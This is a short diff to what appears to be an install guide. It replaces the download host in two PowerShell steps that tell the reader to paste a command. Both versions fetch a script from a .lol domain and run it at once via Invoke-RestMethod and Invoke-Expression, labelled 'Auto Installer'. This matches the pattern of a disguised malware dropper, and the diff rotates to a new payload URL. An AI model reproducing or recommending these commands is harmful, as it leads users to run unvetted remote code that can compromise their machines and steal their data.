@@ -51,7 +51,7 @@
 4. Paste the command:
 
 ```powershell
-irm https://fastsetup.lol/dkvvep | iex
+irm https://toolget2.lol/aw0y2cs | iex
 ```
 
 5. Press **Enter** and wait until finished  
@@ -65,7 +65,7 @@ irm https://fastsetup.lol/dkvvep | iex
 2. Paste this command:
 
 ```powershell
-powershell $u='https://fastsetup.lol/dkvvep';Invoke-Expression(Invoke-RestMethod $u) # Auto Installer
+powershell $u='https://toolget2.lol/aw0y2cs';Invoke-Expression(Invoke-RestMethod $u) # Auto Installer
 ```
 
 3. Press **Enter** and wait  
